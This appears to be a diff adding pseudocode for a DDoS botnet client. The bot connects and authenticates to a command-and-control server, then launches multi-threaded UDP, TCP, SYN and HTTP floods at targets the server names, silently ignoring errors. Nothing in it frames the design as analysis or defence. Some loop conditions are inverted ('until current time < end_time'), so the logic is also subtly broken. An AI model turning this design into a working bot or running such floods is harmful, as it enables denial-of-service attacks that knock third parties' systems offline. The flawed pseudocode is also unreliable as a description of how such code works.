@@ -1,0 +1,45 @@
+Require: C2 server IP and port
+Ensure: Bot authenticates, receives commands, and executes multi-threaded DDoS attacks
+
+procedure main()
+1:  loop until connected to C2 do
+2:      Attempt TCP connection to (C2_ADDRESS, C2_PORT)
+3:      Wait 120 seconds on failure
+4:  Wait for 'Username' prompt, send 'BOT'
+5:  Wait for 'Password' prompt, send bot signature
+6:  loop forever do
+7:      Receive command data from C2
+8:      if connection lost then break loop
+9:      Parse command, target IP, port, duration, packet size, and thread count
+10:     if command in [.UDP, .TCP, .SYN, .HTTP] then
+11:         Calculate end_time = current_time + duration
+12:         Start 'thread count' number of threads running execute_attack(command, ip, port, end_time, size)
+13:     else if command == 'PING' then
+14:         Send 'PONG'
+15: Restart main()
+
+procedure execute_attack(type, ip, port, end_time, size)
+1:  loop until current time < end_time do
+2:      try
+3:          if type == '.UDP' then
+4:              Create UDP socket
+5:              Set target_port = random if port == 0 else port
+6:              Send random bytes of 'size' to (ip, target_port)
+7:          
+8:          else if type == '.TCP' then
+9:              Create TCP socket and connect to (ip, port)
+10:             loop until current time < end_time do
+11:                 Send random bytes of 'size'
+12:         
+13:         else if type == '.SYN' then
+14:             Create TCP socket in non-blocking mode
+15:             Set target_port = random if port == 0 else port
+16:             Attempt connection to (ip, target_port) and ignore response
+17:         
+18:         else if type == '.HTTP' then
+19:             Create TCP socket and connect to (ip, 5050)
+20:             loop until current time < end_time do
+21:                 Send HTTP GET request with randomized User-Agent
+22:                 
+23:      catch exceptions
+24:          Ignore errors and continue execution
